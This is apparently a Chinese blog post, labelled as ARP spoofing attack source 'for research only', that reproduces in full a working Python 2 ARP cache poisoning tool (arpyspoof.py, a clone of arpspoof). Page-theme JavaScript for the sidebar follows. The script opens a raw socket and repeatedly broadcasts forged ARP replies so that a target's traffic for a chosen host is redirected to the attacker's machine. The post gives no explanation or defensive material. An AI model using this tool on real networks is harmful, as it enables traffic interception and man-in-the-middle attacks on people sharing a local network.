        <p>arp欺骗攻击源码，仅用于研究所用。<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/python</span><br><span class="line"></span><br><span class="line">#############################################################################</span><br><span class="line">##                                                                         ##</span><br><span class="line">## arpyspoof.py --- clone of arpspoof.                                     ##</span><br><span class="line">##                  See www.arp-sk.org for more infos about ARP cache      ##</span><br><span class="line">##                  poisoning and other tools to do that                   ##</span><br><span class="line">##                                                                         ##</span><br><span class="line">## Copyright (C) 2002  Philippe Biondi &lt;biondi@cartel-securite.fr&gt;         ##</span><br><span class="line">##                                                                         ##</span><br><span class="line">## This program is free software; you can redistribute it and/or modify it ##</span><br><span class="line">## under the terms of the GNU General Public License as published by the   ##</span><br><span class="line">## Free Software Foundation; either version 2, or (at your option) any     ##</span><br><span class="line">## later version.                                                          ##</span><br><span class="line">##                                                                         ##</span><br><span class="line">## This program is distributed in the hope that it will be useful, but     ##</span><br><span class="line">## WITHOUT ANY WARRANTY; without even the implied warranty of              ##</span><br><span class="line">## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU       ##</span><br><span class="line">## General Public License for more details.                                ##</span><br><span class="line">##                                                                         ##</span><br><span class="line">#############################################################################</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import getopt,sys,string</span><br><span class="line">from socket import *</span><br><span class="line">from struct import *</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ETHER_BROADCAST=&quot;\xff&quot;*6</span><br><span class="line">ETH_P_ETHER=0x0001</span><br><span class="line">ETH_P_IP=0x0800</span><br><span class="line">ETH_P_ARP=0x0806</span><br><span class="line"></span><br><span class="line">def usage():</span><br><span class="line">    print &quot;Usage: %s [-t target] [-i interface] [-s sleep] host&quot;</span><br><span class="line">    print &quot;\t host : host to take over&quot;</span><br><span class="line">    print &quot;\t target : MAC address of a specific target to ARP poison&quot;</span><br><span class="line">    print &quot;\t sleep : time to sleep (in seconds) between two packets&quot;</span><br><span class="line">    sys.exit(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def ether(src, dst, type):</span><br><span class="line">    return dst+src+pack(&quot;!H&quot;,type)</span><br><span class="line"></span><br><span class="line">def arp(hw, p, hwlen, plen, op, hwsrc, psrc, hwdst, pdst):</span><br><span class="line">    return pack(&quot;!HHBBH&quot;, hw, p, hwlen, plen, op) + hwsrc + psrc + hwdst + pdst</span><br><span class="line"></span><br><span class="line">def is_at(macsrc,ipsrc):</span><br><span class="line">    return arp(ETH_P_ETHER, ETH_P_IP, 6, 4, 2, </span><br><span class="line">               macsrc, inet_aton(ipsrc), ETHER_BROADCAST, pack(&quot;!I&quot;,INADDR_ANY))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def mac2str(a):</span><br><span class="line">    return reduce(str.__add__,map(lambda x: chr(int(x,16)), a.split(&quot;:&quot;)))</span><br><span class="line"></span><br><span class="line">def str2mac(a):</span><br><span class="line">    return &quot;%02x:%02x:%02x:%02x:%02x:%02x&quot; % unpack(&quot;!6B&quot;,a)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    opts=getopt.getopt(sys.argv[1:], &quot;i:t:s:h&quot;)</span><br><span class="line"></span><br><span class="line">    target = &quot;\xff\xff\xff\xff\xff\xff&quot;</span><br><span class="line">    dev = &quot;eth0&quot;</span><br><span class="line">    slptime = 2</span><br><span class="line">    for opt, parm in opts[0]:</span><br><span class="line">        if opt == &quot;-h&quot;:</span><br><span class="line">            usage()</span><br><span class="line">        elif opt == &quot;-t&quot;:</span><br><span class="line">            target = mac2str(parm) # XXX get mac from IP</span><br><span class="line">        elif opt == &quot;-i&quot;:</span><br><span class="line">            dev = parm</span><br><span class="line">        elif opt == &quot;-s&quot;:</span><br><span class="line">	    try:</span><br><span class="line">                slptime = float(parm)</span><br><span class="line">            except ValueError,msg:</span><br><span class="line">                raise getopt.GetoptError(&quot;&apos;sleep&apos; parameter error: &quot;+msg.__repr__(),None)</span><br><span class="line"></span><br><span class="line">    if len(opts[1]) == 0 :</span><br><span class="line">        raise getopt.GetoptError(&quot;&apos;host&apos; parameter missing&quot;,None)</span><br><span class="line">    elif len(opts[1]) &gt; 1 :</span><br><span class="line">        raise getopt.GetoptError(&quot;Too many parameters : [%s]&quot; % string.join(opts[1]),None)</span><br><span class="line">    else:</span><br><span class="line">        host = opts[1][0]</span><br><span class="line"></span><br><span class="line">    print &quot;dev:&quot;, dev</span><br><span class="line">    print &quot;target:&quot;, str2mac(target) </span><br><span class="line">    print &quot;host:&quot;, host</span><br><span class="line">except getopt.error, msg:</span><br><span class="line">    print &quot;ERROR:&quot;,msg</span><br><span class="line">    usage()</span><br><span class="line">except KeyboardInterrupt:</span><br><span class="line">    print &quot;Interrupted by user&quot;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))</span><br><span class="line">    s.bind((dev, ETH_P_ARP))</span><br><span class="line">    mymac = s.getsockname()[4] </span><br><span class="line">    pkt = ether(mymac, target, ETH_P_ARP) + is_at(mymac, host)</span><br><span class="line">    disp = &quot;%s -&gt; %s   %s is-at %s&quot; % (str2mac(mymac), str2mac(target), host, str2mac(mymac))</span><br><span class="line">    while 1:</span><br><span class="line">    	s.send(pkt)</span><br><span class="line">	print disp</span><br><span class="line">	sleep(slptime)</span><br><span class="line">except KeyboardInterrupt:</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure></p>

<script type="text/javascript" id="sidebar.toc.highlight">
  $(document).ready(function () {
    var tocSelector = '.post-toc';
    var $tocSelector = $(tocSelector);
    var activeCurrentSelector = '.active-current';

    $tocSelector
      .on('activate.bs.scrollspy', function () {
        var $currentActiveElement = $(tocSelector + ' .active').last();

        removeCurrentActiveClass();
        $currentActiveElement.addClass('active-current');

        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
      })
      .on('clear.bs.scrollspy', function () {
        removeCurrentActiveClass();
      });

    function removeCurrentActiveClass () {
      $(tocSelector + ' ' + activeCurrentSelector)
        .removeClass(activeCurrentSelector.substring(1));
    }

    function processTOC () {
      getTOCMaxHeight();
      toggleTOCOverflowIndicators();
    }

    function getTOCMaxHeight () {
      var height = $('.sidebar').height() -
                   $tocSelector.position().top -
                   $('.post-toc-indicator-bottom').height();

      $tocSelector.css('height', height);

      return height;
    }

    function toggleTOCOverflowIndicators () {
      tocOverflowIndicator(
        '.post-toc-indicator-top',
        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
      );

      tocOverflowIndicator(
        '.post-toc-indicator-bottom',
        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
      )
    }

    $(document).on('sidebar.motion.complete', function () {
      processTOC();
    });

    $('body').scrollspy({ target: tocSelector });
    $(window).on('resize', function () {
      if ( $('.sidebar').hasClass('sidebar-active') ) {
        processTOC();
      }
    });

    onScroll($tocSelector);

    function onScroll (element) {
      element.on('mousewheel DOMMouseScroll', function (event) {
          var oe = event.originalEvent;
          var delta = oe.wheelDelta || -oe.detail;

          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
          event.preventDefault();

          toggleTOCOverflowIndicators();
      });
    }

    function tocOverflowIndicator (indicator, action) {
      var $indicator = $(indicator);
      var opacity = action === 'show' ? 1 : 0;
      $indicator.velocity ?
        $indicator.velocity('stop').velocity({
          opacity: opacity
        }, { duration: 100 }) :
        $indicator.stop().animate({
          opacity: opacity
        }, 100);
    }

  });
</script>

      var activeTabClassName = 'sidebar-nav-active';
      var activePanelClassName = 'sidebar-panel-active';
      if (item.hasClass(activeTabClassName)) {
        return;
      }

      var currentTarget = $('.' + activePanelClassName);
      var target = $('.' + item.data('target'));

      hasVelocity ?
        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
          target
            .velocity('stop')
            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
            .addClass(activePanelClassName);
        }) :
        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
          currentTarget.hide();
          target
            .stop()
            .css({'opacity': 0, 'display': 'block'})
            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
              currentTarget.removeClass(activePanelClassName);
              target.addClass(activePanelClassName);
            });
        });

      item.siblings().removeClass(activeTabClassName);
      item.addClass(activeTabClassName);
    });

    $('.post-toc a').on('click', function (e) {
      e.preventDefault();
      var targetSelector = NexT.utils.escapeSelector(this.getAttribute('href'));
      var offset = $(targetSelector).offset().top;
      hasVelocity ?
        html.velocity('stop').velocity('scroll', {
          offset: offset  + 'px',
          mobileHA: false
        }) :
        $('html, body').stop().animate({
          scrollTop: offset
        }, 500);
    });

    // Expand sidebar on post detail page by default, when post has a toc.
    NexT.motion.middleWares.sidebar = function () {
      var $tocContent = $('.post-toc-content');

      if (CONFIG.sidebar.display === 'post' || CONFIG.sidebar.display === 'always') {
        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
          NexT.utils.displaySidebar();
        }
      }
    };
  });
</script>
